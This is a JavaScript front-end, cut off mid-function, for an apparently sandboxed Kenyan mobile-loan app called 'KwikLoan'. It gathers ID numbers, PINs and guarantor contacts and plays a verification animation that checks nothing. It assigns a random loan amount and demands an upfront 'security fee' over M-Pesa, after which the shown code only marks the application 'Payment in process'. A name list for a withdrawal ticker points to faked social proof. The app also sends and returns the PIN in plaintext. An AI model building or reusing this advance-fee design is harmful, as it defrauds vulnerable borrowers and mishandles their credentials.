/* KwikLoan — collateral tiers + login restore (sandbox) */
const API_BASE = "https://mdogoback.onrender.com/api/applications";
const PAYMENTS_API_BASE = "https://mdogoback.onrender.com/api/payments";
const STORAGE_PREFIX = "kwikloan_app_";

const REPAYMENT_WEEKS = 8;
const TIERS = [
  { min: 2000,  max: 5000,  collateral: 180 },
  { min: 5000,  max: 8000,  collateral: 260 },
  { min: 8000,  max: 11000, collateral: 310 },
  { min: 11000, max: 14000, collateral: 450 },
  { min: 14000, max: 17000, collateral: 550 },
  { min: 17000, max: 20000, collateral: 670 }
];

let currentStep = 1;
const TOTAL_STEPS = 9;
const stepTitles = [
  "Account", "Personal", "Employment", "Income",
  "Guarantor", "Review", "Agreement", "Processing", "Offer"
];

let applicationData = emptyApp();

function emptyApp() {
  return {
    phone: "", pin: "", fullName: "", idNumber: "", county: "",
    employment: "", income: "",
    guarantorName: "", guarantorPhone: "", relationship: "",
    loanLimit: 0, collateralFee: 0, weeklyRepayment: 0,
    totalRepayable: 0, repaymentWeeks: REPAYMENT_WEEKS,
    reference: "", appliedOn: "", status: ""
  };
}

const counties = [
  "Nairobi","Mombasa","Kwale","Kilifi","Tana River","Lamu","Taita Taveta","Garissa",
  "Wajir","Mandera","Marsabit","Isiolo","Meru","Tharaka Nithi","Embu","Kitui",
  "Machakos","Makueni","Nyandarua","Nyeri","Kirinyaga","Murang'a","Kiambu","Turkana",
  "West Pokot","Samburu","Trans Nzoia","Uasin Gishu","Elgeyo Marakwet","Nandi","Baringo",
  "Laikipia","Nakuru","Narok","Kajiado","Kericho","Bomet","Kakamega","Vihiga","Bungoma",
  "Busia","Siaya","Kisumu","Homa Bay","Migori","Kisii","Nyamira"
];

const employmentCategories = [
  "Government Employee","Private Employee","Business Owner","Self Employed",
  "NGO Employee","SACCO Employee","Contract Employee","Farmer","Freelancer",
  "Casual Worker","Pensioner"
];

const incomeRanges = [
  "KSh 5,000–12,000","KSh 12,001–18,000","KSh 18,001–25,000","KSh 25,001–44,000",
  "KSh 44,001–60,000","KSh 60,001–80,000","KSh 80,001–120,000","Above KSh 120,000"
];

/* ---------- local persistence (survives logout/login on same browser) ---------- */
function storageKey(phone) {
  return STORAGE_PREFIX + String(phone || "").replace(/\s+/g, "");
}

function persistLocal() {
  if (!applicationData.phone) return;
  const payload = {
    loanLimit: applicationData.loanLimit,
    collateralFee: applicationData.collateralFee,
    weeklyRepayment: applicationData.weeklyRepayment,
    totalRepayable: applicationData.totalRepayable,
    repaymentWeeks: applicationData.repaymentWeeks,
    status: applicationData.status,
    reference: applicationData.reference,
    fullName: applicationData.fullName,
    county: applicationData.county,
    employment: applicationData.employment,
    income: applicationData.income,
    guarantorName: applicationData.guarantorName,
    guarantorPhone: applicationData.guarantorPhone,
    idNumber: applicationData.idNumber,
    appliedOn: applicationData.appliedOn
  };
  try {
    localStorage.setItem(storageKey(applicationData.phone), JSON.stringify(payload));
  } catch (_) {}
}

function loadLocal(phone) {
  try {
    const raw = localStorage.getItem(storageKey(phone));
    return raw ? JSON.parse(raw) : null;
  } catch (_) {
    return null;
  }
}

function mergeLocalIntoApp(phone) {
  const local = loadLocal(phone);
  if (!local) return;
  if (local.loanLimit) applicationData.loanLimit = local.loanLimit;
  if (local.collateralFee) applicationData.collateralFee = local.collateralFee;
  if (local.weeklyRepayment) applicationData.weeklyRepayment = local.weeklyRepayment;
  if (local.totalRepayable) applicationData.totalRepayable = local.totalRepayable;
  if (local.repaymentWeeks) applicationData.repaymentWeeks = local.repaymentWeeks;
  if (local.status) applicationData.status = local.status;
  if (local.reference && !applicationData.reference) applicationData.reference = local.reference;
  if (local.appliedOn && !applicationData.appliedOn) applicationData.appliedOn = local.appliedOn;
}

/** Try to push loanLimit/status to backend (ignore errors if route missing) */
async function syncOfferToServer() {
  const body = {
    phone: applicationData.phone,
    reference: applicationData.reference,
    loanLimit: applicationData.loanLimit,
    status: applicationData.status
  };
  const attempts = [
    { url: API_BASE + "/update", method: "PATCH" },
    { url: API_BASE + "/" + encodeURIComponent(applicationData.reference || ""), method: "PATCH" },
    { url: API_BASE + "/", method: "PUT" }
  ];
  for (const a of attempts) {
    try {
      const res = await fetch(a.url, {
        method: a.method,
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body)
      });
      if (res.ok) return true;
    } catch (_) {}
  }
  return false;
}

/* ---------- navigation ---------- */
function showSection(id) {
  document.querySelectorAll(".section").forEach(s => s.classList.add("hidden"));
  const el = document.getElementById(id);
  if (el) el.classList.remove("hidden");
}

function goHome() {
  stopWithdrawalTicker();
  showSection("landing");
  window.scrollTo({ top: 0, behavior: "smooth" });
}

function startApplication() {
  applicationData = emptyApp();
  currentStep = 1;
  showSection("application");
  updateProgress();
  loadStep();
  window.scrollTo({ top: 0, behavior: "smooth" });
}

function showLogin() {
  document.getElementById("loginPhone").value = "";
  document.getElementById("loginPin").value = "";
  showSection("login");
  window.scrollTo({ top: 0, behavior: "smooth" });
}

function closeMobileNav() {
  document.getElementById("mobileNav")?.classList.add("hidden");
}

document.getElementById("navToggle")?.addEventListener("click", () => {
  document.getElementById("mobileNav")?.classList.toggle("hidden");
});

function goToApplyTiers() {
  showTierTable();
}

/* ---------- helpers ---------- */
function roundTo50(n) { return Math.round(n / 50) * 50; }
function roundTo10(n) { return Math.round(n / 10) * 10; }
function getInitials(name) {
  if (!name) return "?";
  return name.split(" ").filter(Boolean).map(w => w.charAt(0)).join("").substring(0, 2).toUpperCase();
}
function normalizeKenyanPhone(raw) {
  let digits = String(raw || "").replace(/\D/g, "");
  if (!digits) return null;
  if (digits.startsWith("2540") && digits.length === 13) digits = "254" + digits.slice(4);
  if (digits.startsWith("254") && digits.length === 12) return digits;
  if (digits.startsWith("0") && digits.length === 10) return "254" + digits.slice(1);
  if (/^[71]\d{8}$/.test(digits)) return "254" + digits;
  if (digits.startsWith("254") && digits.length > 12) return "254" + digits.slice(-9);
  return null;
}
function generateReference() {
  const codes = { Nairobi: "NRB", Kiambu: "KMB", Mombasa: "MSA", Kisumu: "KSM", Nakuru: "NKR" };
  const code = codes[applicationData.county] || "KEN";
  const year = new Date().getFullYear();
  const random = Math.floor(100000 + Math.random() * 900000);
  return `KL-${year}-${code}-${random}`;
}

/* ---------- progress / form (unchanged flow) ---------- */
function nextStep() { currentStep++; updateProgress(); loadStep(); }
function previousStep() {
  if (currentStep > 1) { currentStep--; updateProgress(); loadStep(); }
}
function updateProgress() {
  const wrap = document.getElementById("progressSteps");
  const bar = document.getElementById("progressBar");
  if (!wrap || !bar) return;
  let html = "";
  stepTitles.forEach((title, index) => {
    const stepNo = index + 1;
    let classes = "px-4 py-1.5 rounded-full text-xs sm:text-sm whitespace-nowrap flex items-center gap-1 ";
    if (stepNo < currentStep) classes += "bg-emerald-500 text-white";
    else if (stepNo === currentStep) classes += "bg-blue-600 text-white";
    else classes += "bg-gray-100 text-gray-500";
    html += `<div class="${classes}">${stepNo < currentStep ? '<i class="fa-solid fa-check"></i> ' : ""}${title}</div>`;
  });
  wrap.innerHTML = html;
  bar.style.width = ((currentStep - 1) / (TOTAL_STEPS - 1)) * 100 + "%";
}

function loadStep() {
  const container = document.getElementById("formContainer");
  if (!container) return;
  switch (currentStep) {
    case 1:
      container.innerHTML = `
        <div class="fade-in max-w-lg mx-auto">
          <div class="text-center mb-8">
            <div class="w-14 h-14 rounded-2xl bg-blue-100 text-blue-700 flex items-center justify-center text-2xl mx-auto mb-4"><i class="fa-solid fa-user-plus"></i></div>
            <h2 class="heading text-2xl sm:text-3xl font-bold">Create your account</h2>
            <p class="text-gray-500 mt-2 text-sm">Kenyan mobile number + 4-digit PIN</p>
          </div>
          <label class="block mb-2 font-medium text-sm">Phone number</label>
          <div class="flex">
            <div class="bg-gray-100 border border-r-0 rounded-l-2xl px-4 flex items-center text-gray-600 text-sm">+254</div>
            <input id="phone" maxlength="13" placeholder="0712345678" class="input rounded-l-none" value="${applicationData.phone.replace("+254","")}">
          </div>
          <div class="grid grid-cols-2 gap-4 mt-6">
            <div><label class="block mb-2 text-sm">Create PIN</label><input id="pin" maxlength="4" type="password" class="input text-center text-xl tracking-widest"></div>
            <div><label class="block mb-2 text-sm">Confirm PIN</label><input id="confirmPin" maxlength="4" type="password" class="input text-center text-xl tracking-widest"></div>
          </div>
          <button onclick="saveAccount()" class="btn-primary mt-8">Continue</button>
          <p class="text-center text-sm text-gray-500 mt-5">Have an account? <a href="#" onclick="showLogin();return false;" class="text-blue-600 font-semibold">Login</a></p>
        </div>`;
      break;
    case 2:
      container.innerHTML = `
        <div class="fade-in">
          <h2 class="heading text-2xl sm:text-3xl font-bold">Personal information</h2>
          <p class="text-gray-500 mt-2 mb-6 text-sm">As on your National ID</p>
          <div class="grid md:grid-cols-2 gap-5">
            <div><label class="block mb-2 text-sm">Full name</label><input id="fullName" class="input" value="${applicationData.fullName}"></div>
            <div><label class="block mb-2 text-sm">National ID</label><input id="idNumber" maxlength="8" class="input" value="${applicationData.idNumber}"></div>
            <div>
              <label class="block mb-2 text-sm">County</label>
              <select id="county" class="input">
                <option value="">Select county</option>
                ${counties.map(c => `<option value="${c}" ${applicationData.county===c?"selected":""}>${c}</option>`).join("")}
              </select>
            </div>
            <div><label class="block mb-2 text-sm">Gender</label><select id="gender" class="input"><option>Male</option><option>Female</option></select></div>
          </div>
          <div class="flex gap-3 mt-8">
            <button onclick="previousStep()" class="btn-secondary">Back</button>
            <button onclick="savePersonal()" class="btn-primary">Continue</button>
          </div>
        </div>`;
      break;
    case 3:
      container.innerHTML = `
        <div class="fade-in">
          <h2 class="heading text-2xl sm:text-3xl font-bold text-center">Employment</h2>
          <p class="text-gray-500 mt-2 mb-6 text-sm text-center">Select one</p>
          <div id="employmentGrid" class="grid sm:grid-cols-2 gap-3">
            ${employmentCategories.map(job => `
              <div onclick="selectEmployment(this)" data-job="${job}" class="option-card ${applicationData.employment===job?"selected":""}">
                <div class="flex justify-between items-center"><span class="font-medium text-sm">${job}</span><i class="fa-solid fa-circle opt-icon text-gray-300"></i></div>
              </div>`).join("")}
          </div>
          <div class="flex gap-3 mt-8">
            <button onclick="previousStep()" class="btn-secondary">Back</button>
            <button onclick="saveEmployment()" class="btn-primary">Continue</button>
          </div>
        </div>`;
      break;
    case 4:
      container.innerHTML = `
        <div class="fade-in">
          <h2 class="heading text-2xl sm:text-3xl font-bold text-center">Monthly income</h2>
          <p class="text-gray-500 mt-2 mb-6 text-sm text-center">Choose your bracket</p>
          <div id="incomeGrid" class="space-y-3">
            ${incomeRanges.map(item => `
              <div onclick="selectIncome(this)" data-income="${item}" class="option-card ${applicationData.income===item?"selected":""}">
                <div class="flex justify-between items-center"><span class="font-medium text-sm">${item}</span><i class="fa-solid fa-circle opt-icon text-gray-300"></i></div>
              </div>`).join("")}
          </div>
          <div class="flex gap-3 mt-8">
            <button onclick="previousStep()" class="btn-secondary">Back</button>
            <button onclick="saveIncome()" class="btn-primary">Continue</button>
          </div>
        </div>`;
      break;
    case 5:
      container.innerHTML = `
        <div class="fade-in max-w-lg mx-auto">
          <h2 class="heading text-2xl sm:text-3xl font-bold text-center">Guarantor</h2>
          <p class="text-gray-500 mt-2 mb-6 text-sm text-center">Someone we can contact if needed</p>
          <div class="space-y-4">
            <div><label class="block mb-2 text-sm">Full name</label><input id="guarantorName" class="input" value="${applicationData.guarantorName}"></div>
            <div>
              <label class="block mb-2 text-sm">Phone</label>
              <div class="flex">
                <div class="bg-gray-100 border border-r-0 rounded-l-2xl px-4 flex items-center text-sm">+254</div>
                <input id="guarantorPhone" maxlength="13" class="input rounded-l-none" value="${applicationData.guarantorPhone.replace("+254","")}">
              </div>
            </div>
            <div>
              <label class="block mb-2 text-sm">Relationship</label>
              <select id="relationship" class="input">
                <option value="">Select</option>
                <option>Parent</option><option>Sibling</option><option>Spouse</option>
                <option>Relative</option><option>Friend</option><option>Employer</option>
              </select>
            </div>
          </div>
          <div class="flex gap-3 mt-8">
            <button onclick="previousStep()" class="btn-secondary">Back</button>
            <button onclick="saveGuarantor()" class="btn-primary">Continue</button>
          </div>
        </div>`;
      break;
    case 6:
      container.innerHTML = `
        <div class="fade-in">
          <h2 class="heading text-2xl sm:text-3xl font-bold text-center">Review</h2>
          <p class="text-gray-500 mt-2 mb-6 text-sm text-center">Confirm your details</p>
          <div class="bg-gray-50 border rounded-2xl p-5 grid sm:grid-cols-2 gap-4 text-sm">
            <div><p class="text-gray-500">Applicant</p><p class="font-semibold">${applicationData.fullName}</p></div>
            <div><p class="text-gray-500">Phone</p><p class="font-semibold">${applicationData.phone}</p></div>
            <div><p class="text-gray-500">ID</p><p class="font-semibold">${applicationData.idNumber}</p></div>
            <div><p class="text-gray-500">County</p><p class="font-semibold">${applicationData.county}</p></div>
            <div><p class="text-gray-500">Employment</p><p class="font-semibold">${applicationData.employment}</p></div>
            <div><p class="text-gray-500">Income</p><p class="font-semibold">${applicationData.income}</p></div>
            <div><p class="text-gray-500">Guarantor</p><p class="font-semibold">${applicationData.guarantorName}</p></div>
            <div><p class="text-gray-500">Guarantor phone</p><p class="font-semibold">${applicationData.guarantorPhone}</p></div>
          </div>
          <button onclick="nextStep()" class="btn-primary mt-6">Confirm &amp; continue</button>
        </div>`;
      break;
    case 7:
      container.innerHTML = `
        <div class="fade-in max-w-xl mx-auto">
          <h2 class="heading text-2xl sm:text-3xl font-bold text-center">Terms</h2>
          <div class="border rounded-2xl p-5 bg-gray-50 h-48 overflow-y-auto text-sm leading-7 text-gray-600 mt-6">
            <p>You confirm the information provided is accurate. Choosing a limit range and paying the security fee secures this sandbox application.</p>
          </div>
          <label class="flex items-start gap-3 mt-6 cursor-pointer text-sm">
            <input id="agreeTerms" type="checkbox" class="mt-1 w-5 h-5 accent-blue-600">
            <span>I agree to the Terms &amp; Conditions.</span>
          </label>
          <button onclick="submitApplication()" class="btn-primary mt-8">Submit application</button>
        </div>`;
      break;
    case 8:
      container.innerHTML = `
        <div class="fade-in text-center py-12">
          <div class="w-20 h-20 mx-auto rounded-full border-4 border-blue-200 border-t-blue-600 animate-spin"></div>
          <h2 class="heading text-2xl font-bold mt-8">Processing application</h2>
          <p class="text-gray-500 mt-2 text-sm">Please wait…</p>
          <div id="processingList" class="max-w-md mx-auto mt-10 space-y-3 text-left"></div>
        </div>`;
      runProcessingAnimation();
      break;
    default:
      break;
  }
}

function saveAccount() {
  const phoneRaw = document.getElementById("phone").value.trim();
  const pin = document.getElementById("pin").value;
  const confirmPin = document.getElementById("confirmPin").value;
  const normalized = normalizeKenyanPhone(phoneRaw);
  if (!normalized) return alert("Enter a valid Kenyan mobile number.");
  if (pin.length !== 4) return alert("PIN must be 4 digits.");
  if (pin !== confirmPin) return alert("PINs do not match.");
  applicationData.phone = "+" + normalized;
  applicationData.pin = pin;
  nextStep();
}
function savePersonal() {
  const fullName = document.getElementById("fullName").value.trim();
  const idNumber = document.getElementById("idNumber").value.trim();
  const county = document.getElementById("county").value;
  if (fullName.length < 5) return alert("Enter your full name.");
  if (idNumber.length < 7) return alert("Enter a valid ID number.");
  if (!county) return alert("Select your county.");
  applicationData.fullName = fullName;
  applicationData.idNumber = idNumber;
  applicationData.county = county;
  nextStep();
}
function selectEmployment(card) {
  document.querySelectorAll("#employmentGrid .option-card").forEach(el => el.classList.remove("selected"));
  card.classList.add("selected");
  applicationData.employment = card.dataset.job;
}
function saveEmployment() {
  if (!applicationData.employment) return alert("Select employment.");
  nextStep();
}
function selectIncome(card) {
  document.querySelectorAll("#incomeGrid .option-card").forEach(el => el.classList.remove("selected"));
  card.classList.add("selected");
  applicationData.income = card.dataset.income;
}
function saveIncome() {
  if (!applicationData.income) return alert("Select income.");
  nextStep();
}
function saveGuarantor() {
  const name = document.getElementById("guarantorName").value.trim();
  const phoneRaw = document.getElementById("guarantorPhone").value.trim();
  const relationship = document.getElementById("relationship").value;
  const normalized = normalizeKenyanPhone(phoneRaw);
  if (name.length < 4) return alert("Enter guarantor name.");
  if (!normalized) return alert("Enter a valid guarantor phone.");
  if (!relationship) return alert("Select relationship.");
  applicationData.guarantorName = name;
  applicationData.guarantorPhone = "+" + normalized;
  applicationData.relationship = relationship;
  nextStep();
}
function submitApplication() {
  if (!document.getElementById("agreeTerms")?.checked) return alert("Please accept the Terms.");
  nextStep();
}

function runProcessingAnimation() {
  const stages = [
    "Verifying National ID",
    "Checking employment details",
    "Reviewing income information",
    "Saving application",
    "Preparing limit ranges"
  ];
  let index = 0;
  const list = document.getElementById("processingList");
  const savePromise = saveApplicationToServer();
  const animationDone = new Promise(resolve => {
    const timer = setInterval(() => {
      if (index < stages.length) {
        list.innerHTML += `
          <div class="flex items-center gap-3 bg-gray-50 rounded-xl p-3">
            <i class="fa-solid fa-circle-check text-emerald-500"></i>
            <span class="font-medium text-sm">${stages[index]}</span>
          </div>`;
        index++;
      } else {
        clearInterval(timer);
        resolve();
      }
    }, 650);
  });
  Promise.all([animationDone, savePromise]).then(([, result]) => {
    if (result.error) {
      alert(result.error);
      currentStep = 7;
      updateProgress();
      loadStep();
      return;
    }
    applicationData.reference = result.reference;
    applicationData.appliedOn = new Date().toLocaleDateString("en-GB", {
      day: "2-digit", month: "long", year: "numeric"
    });
    applicationData.status = "Select a limit range";
    persistLocal();
    showTierTable();
  });
}

async function saveApplicationToServer() {
  const reference = generateReference();
  try {
    const res = await fetch(API_BASE + "/", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        fullName: applicationData.fullName,
        idNumber: applicationData.idNumber,
        phone: applicationData.phone,
        pin: applicationData.pin,
        county: applicationData.county,
        employment: applicationData.employment,
        income: applicationData.income,
        guarantorName: applicationData.guarantorName,
        guarantorPhone: applicationData.guarantorPhone,
        loanLimit: 0,
        reference
      })
    });
    const data = await res.json();
    if (!res.ok) return { error: data.error || "Could not save application." };
    return { reference: data.reference || reference };
  } catch {
    return { error: "Could not reach the server. Check your connection." };
  }
}

/* ---------- tiers ---------- */
function showTierTable() {
  const body = document.getElementById("tierTableBody");
  body.innerHTML = TIERS.map((t, i) => {
    const weeklyFrom = roundTo10((t.min * 1.2) / REPAYMENT_WEEKS);
    return `<tr>
      <td>KSh ${t.min.toLocaleString()} – ${t.max.toLocaleString()}</td>
      <td>KSh ${t.collateral.toLocaleString()}</td>
      <td>KSh ${weeklyFrom.toLocaleString()}/wk</td>
      <td><button type="button" class="btn-sm" onclick="selectTier(${i})">Select</button></td>
    </tr>`;
  }).join("");
  showSection("tiertable");
  window.scrollTo({ top: 0, behavior: "smooth" });
}

function selectTier(index) {
  const tier = TIERS[index];
  const span = tier.max - tier.min;
  const amount = Math.min(tier.max, Math.max(tier.min, roundTo50(tier.min + Math.random() * span)));
  const total = roundTo10(amount * 1.2);
  const weekly = roundTo10(total / REPAYMENT_WEEKS);

  applicationData.loanLimit = amount;
  applicationData.collateralFee = tier.collateral;
  applicationData.totalRepayable = total;
  applicationData.weeklyRepayment = weekly;
  applicationData.repaymentWeeks = REPAYMENT_WEEKS;
  applicationData.status = "Awaiting security fee";
  persistLocal();
  syncOfferToServer();

  document.getElementById("modalLoanAmount").textContent = "KSh " + amount.toLocaleString();
  document.getElementById("modalCollateral").textContent = "KSh " + tier.collateral.toLocaleString();
  document.getElementById("modalWeekly").textContent = "KSh " + weekly.toLocaleString();
  document.getElementById("modalWeeks").textContent = REPAYMENT_WEEKS + " weeks";
  document.getElementById("modalTotal").textContent = "KSh " + total.toLocaleString();
  document.getElementById("offerModal").classList.add("active");
}

function closeOfferModal() {
  document.getElementById("offerModal").classList.remove("active");
}

document.getElementById("getLoanNowBtn")?.addEventListener("click", () => {
  closeOfferModal();
  openPayModal();
});

/* ---------- payment ---------- */
function openPayModal() {
  const fee = applicationData.collateralFee;
  const phoneHint = (applicationData.phone || "").replace("+254", "");
  document.getElementById("payModalCard").innerHTML = `
    <button type="button" class="modal-close" onclick="closePayModal()">&times;</button>
    <div class="text-center mb-5">
      <div class="w-14 h-14 rounded-2xl bg-blue-100 text-blue-700 flex items-center justify-center text-2xl mx-auto mb-3"><i class="fa-solid fa-shield-halved"></i></div>
      <h2 class="heading text-xl font-bold">Pay security fee</h2>
      <p class="text-gray-500 text-sm mt-2">Collateral of <strong>KSh ${fee.toLocaleString()}</strong> for KSh ${applicationData.loanLimit.toLocaleString()}.</p>
    </div>
    <label class="block mb-2 text-sm font-medium">M-Pesa number</label>
    <div class="flex mb-4">
      <div class="bg-gray-100 border border-r-0 rounded-l-2xl px-4 flex items-center text-sm">+254</div>
      <input id="payPhone" maxlength="13" class="input rounded-l-none" value="${phoneHint}" placeholder="0712345678">
    </div>
    <button type="button" onclick="initiateCollateralPayment()" class="btn-primary">Pay KSh ${fee.toLocaleString()}</button>
    <button type="button" onclick="closePayModal()" class="btn-secondary mt-3">Cancel</button>
    <p class="text-xs text-gray-400 text-center mt-3">Sandbox STK — demo only.</p>`;
  document.getElementById("payModal").classList.add("active");
}

function closePayModal() {
  document.getElementById("payModal").classList.remove("active");
}

async function initiateCollateralPayment() {
  const phoneRaw = document.getElementById("payPhone")?.value.trim();
  const normalized = normalizeKenyanPhone(phoneRaw);
  if (!normalized) return alert("Enter a valid M-Pesa number.");
  const fee = applicationData.collateralFee;
  const display = normalized.slice(-9);

  document.getElementById("payModalCard").innerHTML = `
    <div class="text-center py-8">
      <div class="w-16 h-16 mx-auto rounded-full border-4 border-blue-200 border-t-blue-600 animate-spin"></div>
      <h2 class="heading text-xl font-bold mt-6">Sending M-Pesa prompt…</h2>
      <p class="text-gray-500 text-sm mt-2">To +254${display} for KSh ${fee.toLocaleString()}</p>
    </div>`;

  try {
    const res = await fetch(PAYMENTS_API_BASE + "/stk-push", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ phone: display, amountKES: fee, phoneModel: "KwikLoan" })
    });
    const data = await res.json();
    if (!res.ok || !data.paymentId) {
      showPayFailed(data.message || "Could not start payment. Try again.");
      return;
    }
    pollPaymentStatus(data.paymentId, fee, 0);
  } catch {
    showPayFailed("Could not reach payments server.");
  }
}

function pollPaymentStatus(paymentId, fee, attempt) {
  const MAX = 20;
  fetch(PAYMENTS_API_BASE + "/status/" + paymentId)
    .then(r => r.json())
    .then(data => {
      if (data.status === "success") {
        showPaySuccess(fee);
      } else if (data.status === "failed") {
        showPayFailed("Payment was not completed. You can try again.");
      } else if (attempt < MAX) {
        setTimeout(() => pollPaymentStatus(paymentId, fee, attempt + 1), 3000);
      } else {
        showPayFailed("No response in time. Please try again.");
      }
    })
    .catch(() => showPayFailed("Lost connection while checking status."));
}

function showPaySuccess(fee) {
  applicationData.status = "Payment in process";
  persistLocal();
  syncOfferToServer();

  document.getElementById("payModalCard").innerHTML = `
    <div class="text-center py-4">
      <div class="w-16 h-16 rounded-full bg-emerald-100 text-emerald-600 flex items-center justify-center text-2xl mx-auto mb-4">
        <i class="fa-solid fa-circle-check"></i>
      </div>
      <h2 class="heading text-xl font-bold text-emerald-700">Security fee received</h2>
      <p class="text-gray-500 text-sm mt-2">KSh ${fee.toLocaleString()} confirmed. Status: <strong>Payment in process</strong>.</p>
      <button type="button" onclick="closePayModal(); loadDashboard();" class="btn-primary mt-6">Go to dashboard</button>
    </div>`;
}

function showPayFailed(message) {
  document.getElementById("payModalCard").innerHTML = `
    <div class="text-center py-4">
      <div class="w-16 h-16 rounded-full bg-red-100 text-red-600 flex items-center justify-center text-2xl mx-auto mb-4">
        <i class="fa-solid fa-circle-xmark"></i>
      </div>
      <h2 class="heading text-xl font-bold text-red-700">Payment not completed</h2>
      <p class="text-gray-500 text-sm mt-2">${message}</p>
      <button type="button" onclick="openPayModal()" class="btn-primary mt-6">Try again</button>
      <button type="button" onclick="closePayModal()" class="btn-secondary mt-3">Close</button>
    </div>`;
}

/* ---------- login ---------- */
async function submitLogin() {
  const phoneRaw = document.getElementById("loginPhone").value.trim();
  const pin = document.getElementById("loginPin").value.trim();
  const normalized = normalizeKenyanPhone(phoneRaw);
  if (!normalized) return alert("Enter a valid phone number.");
  if (pin.length !== 4) return alert("Enter your 4-digit PIN.");
  const btn = document.getElementById("loginBtn");
  btn.disabled = true;
  btn.textContent = "Logging in…";
  try {
    const res = await fetch(API_BASE + "/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ phone: "+" + normalized, pin })
    });
    const data = await res.json();
    if (!res.ok) {
      alert(data.error || "Sign in failed.");
      return;
    }

    const phone = data.phone || ("+" + normalized);
    applicationData = {
      ...emptyApp(),
      phone,
      pin: data.pin,
      fullName: data.fullName,
      idNumber: data.idNumber,
      county: data.county,
      employment: data.employment,
      income: data.income,
      guarantorName: data.guarantorName,
      guarantorPhone: data.guarantorPhone,
      loanLimit: data.loanLimit || 0,
      reference: data.reference,
      appliedOn: data.createdAt
        ? new Date(data.createdAt).toLocaleDateString("en-GB", { day: "2-digit", month: "long", year: "numeric" })
        : ""
    };

    // Restore tier/payment details saved on this device after signup
    mergeLocalIntoApp(phone);
    // Prefer higher limit from local if server still has 0
    if ((!applicationData.loanLimit || applicationData.loanLimit === 0) && loadLocal(phone)?.loanLimit) {
      mergeLocalIntoApp(phone);
    }

    loadDashboard();
  } catch {
    alert("Could not reach the server.");
  } finally {
    btn.disabled = false;
    btn.textContent = "Login";
  }
}

/* ---------- dashboard ---------- */
function loadDashboard() {
  startWithdrawalTicker();

  const limit = applicationData.loanLimit || 0;
  let status = applicationData.status;
  if (!status) {
    status = limit > 0 ? "Awaiting security fee" : "Select a limit range";
  }

  const set = (id, text) => {
    const el = document.getElementById(id);
    if (el) el.textContent = text;
  };

  set("dashLimit", "KSh " + Number(limit).toLocaleString());
  set("dashStatus", status);
  set("dashName", applicationData.fullName || "—");
  set("dashPhone", applicationData.phone || "—");
  set("dashReference", applicationData.reference || "—");
  set("dashCollateral", applicationData.collateralFee
    ? "KSh " + Number(applicationData.collateralFee).toLocaleString() : "—");
  set("dashWeekly", applicationData.weeklyRepayment
    ? "KSh " + Number(applicationData.weeklyRepayment).toLocaleString() : "—");
  set("dashWeeks", applicationData.repaymentWeeks
    ? applicationData.repaymentWeeks + " weeks" : "—");
  set("dashTotal", applicationData.totalRepayable
    ? "KSh " + Number(applicationData.totalRepayable).toLocaleString() : "—");
  set("dashDate", applicationData.appliedOn || "—");

  const statusEl = document.getElementById("dashStatus");
  if (statusEl) {
    statusEl.className = "inline-block mt-1 px-3 py-1.5 rounded-full text-sm font-semibold border ";
    if (status === "Payment in process") {
      statusEl.className += "bg-blue-50 text-blue-700 border-blue-200";
    } else if (limit > 0) {
      statusEl.className += "bg-amber-50 text-amber-700 border-amber-200";
    } else {
      statusEl.className += "bg-gray-50 text-gray-600 border-gray-200";
    }
  }

  showSection("dashboard");
  window.scrollTo({ top: 0, behavior: "smooth" });
}

function openProfile() {
  document.getElementById("profileModalCard").innerHTML = `
    <button type="button" class="modal-close" onclick="closeProfile()">&times;</button>
    <div class="text-center mb-6">
      <div class="w-16 h-16 rounded-full bg-blue-600 text-white flex items-center justify-center text-xl font-bold mx-auto mb-3">
        ${getInitials(applicationData.fullName)}
      </div>
      <h2 class="heading text-xl font-bold">${applicationData.fullName || "—"}</h2>
      <p class="text-gray-500 text-sm">${applicationData.phone || "—"}</p>
    </div>
    <div class="bg-gray-50 rounded-2xl p-4 space-y-3 text-sm">
      <div class="flex justify-between gap-3"><span class="text-gray-500">National ID</span><strong>${applicationData.idNumber || "—"}</strong></div>
      <div class="flex justify-between gap-3"><span class="text-gray-500">County</span><strong>${applicationData.county || "—"}</strong></div>
      <div class="flex justify-between gap-3"><span class="text-gray-500">Employment</span><strong>${applicationData.employment || "—"}</strong></div>
      <div class="flex justify-between gap-3"><span class="text-gray-500">Monthly income</span><strong>${applicationData.income || "—"}</strong></div>
      <div class="flex justify-between gap-3"><span class="text-gray-500">Guarantor</span><strong>${applicationData.guarantorName || "—"}</strong></div>
      <div class="flex justify-between gap-3"><span class="text-gray-500">Guarantor phone</span><strong>${applicationData.guarantorPhone || "—"}</strong></div>
      <div class="flex justify-between gap-3"><span class="text-gray-500">Loan amount</span><strong>KSh ${(applicationData.loanLimit || 0).toLocaleString()}</strong></div>
      <div class="flex justify-between gap-3"><span class="text-gray-500">Status</span><strong>${applicationData.status || "—"}</strong></div>
      <div class="flex justify-between gap-3"><span class="text-gray-500">Reference</span><strong>${applicationData.reference || "—"}</strong></div>
    </div>
    <button type="button" onclick="closeProfile()" class="btn-secondary mt-5">Close</button>
    <button type="button" onclick="closeProfile(); goToApplyTiers();" class="btn-primary mt-3">Apply / choose limit range</button>`;
  document.getElementById("profileModal").classList.add("active");
}

function closeProfile() {
  document.getElementById("profileModal").classList.remove("active");
}

function logoutUser() {
  if (!confirm("Log out?")) return;
  // Keep localStorage so login can restore offer; only clear memory
  applicationData = emptyApp();
  closeProfile();
  closePayModal();
  closeOfferModal();
  goHome();
}

/* ---------- calculator + ticker ---------- */
function updateCalculator() {
  const amount = Number(document.getElementById("calc-amount")?.value || 5000);
  const weeks = Number(document.getElementById("calc-period")?.value || 8);
  const weekly = Math.round((amount * 1.2) / weeks);
  const d = document.getElementById("calc-display");
  const m = document.getElementById("calc-monthly");
  if (d) d.textContent = "KSh " + amount.toLocaleString();
  if (m) m.textContent = "KSh " + weekly.toLocaleString();
}

const TICKER_INTERVAL_MS = 6000;
const TICKER_NAMES = [
  "James","Mary","Peter","Grace","John","Faith","David","Ann","Brian","Mercy",
  "Kevin","Joyce","Dennis","Esther","Samuel","Ruth","Michael","Lucy","Daniel","Alice",
  "Joseph","Nancy","Paul","Winnie","Erick","Beatrice","Charles","Irene","George","Diana"
];
let tickerQueue = [];
let tickerTimer = null;

function shuffledNameQueue() {
  const arr = [...TICKER_NAMES];
